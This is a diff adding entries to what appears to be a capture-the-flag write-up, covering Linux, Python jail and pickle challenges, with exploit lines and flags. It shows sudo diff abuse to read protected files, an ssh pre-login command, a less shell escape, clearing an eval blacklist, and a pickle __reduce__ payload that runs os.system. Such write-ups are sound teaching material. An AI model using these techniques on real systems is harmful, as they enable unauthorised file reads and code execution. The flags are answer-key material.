@@ -174,3 +174,135 @@ def serve():
 > exploit : POST /request with parameters service=file://hr.dep.nextgen.org/flag.txt
 
 > flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}
+
+## Linux
+
+### diff
+
+> Author : Ouxs
+
+    the challenge is a linux container which contains the flag in the / directory but we don't have permission to read it. i checked for suid binaries but nothing, then i did sudo -l to list the commands that users can execute with sudo, i saw that we can execute diff with sudo with the username ctf-cracked, now we will just diff the flag with any other file to get the flag.
+
+> exploit : sudo -u ctf-cracked diff flag.txt /etc/passwd
+
+> flag : shellmates{You_ma$tered_th3_t00L}
+
+### remote
+
+> Author : Ouxs
+
+    the challenge is a linux container which contains the flag in the / directory but the ssh login script always exits instantly, so the trick is to execute a command before the login script, we can do it with ssh by adding the command as the last argument.
+
+> exploit : ssh ctf@remote -o ProxyCommand="openssl s_client -quiet -connect remote.challs.shellmates.club:443 -servername remote.challs.shellmates.club" "cat /flag.txt"
+
+> flag : shellmates{HOW_DID_U_M4d3_i7_HERE!}
+
+### Welcome
+
+> Author : Ouxs
+
+    the challenge is to find the flag in this linux container, we can see that the welcome message is diffrent comparing to other machines, so the first thing is to find how it is printing this message. after a while we found that the /etc/update-motd/01-custom contains the scripts that print the wellcome message, we can see a commented line contains f379bbf265604f3514cda4aadbc05137
+
+> flag : shellmates{f379bbf265604f3514cda4aadbc05137}
+
+
+
+## Jail
+
+### baby jail 1
+
+> Author : Ouxs
+
+    the challenge is a custom python interpreter where we need to open and read the flag file.
+> exploit : open("flag.txt").read()
+
+> flag : shellmates{D0n'7_m3$$_W17H_EVAL_kID0}
+
+### baby jail 2
+
+> Author : Ouxs
+
+    the challenge is a custom python interpreter where the added some filters, if we print the globals we can see a BLACKLIST array containig blacklisted words, so i just clear that array then execute the same command of baby jail 1.
+> exploit : BLACKLIST.clear() then open("flag.txt").read()
+
+> flag : shellmates{Y0u_ar3_st4rting_t0_g3t_g00d_with_LAVE}
+
+### less_jail
+
+> Author : 1m4D
+
+    in this challenge when we ssh we get a less editor, we need just to execute a shell command by pressing on !, then cat the real flag
+
+> exploit : ! then cat real_flag
+
+> flag : shellmates{My_LE$$_J41L_1S_VERy_We4K_76423}
+
+### pickle_games 1
+
+> Author : chenx3n
+
+    in this challenge they gave us a python script, which it reads a data in hex then deserialize it with pickle so the challenge here is to serialize an object that can lead us to the flag.
+
+```python
+#!/usr/bin/env python3
+import pickle
+
+def check(data):
+    return len(data) <= 400
+
+if __name__ == "__main__":
+    print("Welcome to the pickle games! (Level 0)")
+    data = bytes.fromhex(input("Enter your hex-encoded pickle data: "))
+    if check(data):
+        result = pickle.loads(data)
+        print(f"Result: {result}")
+    else:
+        print("Check failed :(")
+```
+
+#### try 1
+
+    in the first try i created a class and redefine the __repr__ function which is called everytime we try to print an object.
+    but i had a problem that on the server side i get an error of class undefined before we reach the print line, so at this time i was thinking if there is a function that will be executed before the object creation,
+
+```python
+class MYClass():
+    def __repr__(self):
+        return open("flag.txt").read()
+
+import pickle
+
+filename = 'dump'
+outfile = open(filename,'wb')
+
+pickle.dump(MYClass(), outfile)
+```
+#### try 2
+
+    after some research i found the reduce function which was used in a lot of ctfs, i created a class and redefined the __reduce__ method and it WORKS XD.
+
+exploit:
+```python
+class MYClass():
+    def __reduce__(self):
+        command = ('cat flag.txt')
+        return os.system, (command,)
+
+import pickle
+
+filename = 'dump'
+outfile = open(filename,'wb')
+
+pickle.dump(MYClass(), outfile)
+```
+
+> flag : shellmates{lEt_thE_piCkl3_gaMeS_BegiN!}
+
+
+## PWN
+
+### B0F0
+
+> Author : 1m4D
+
+to be continued
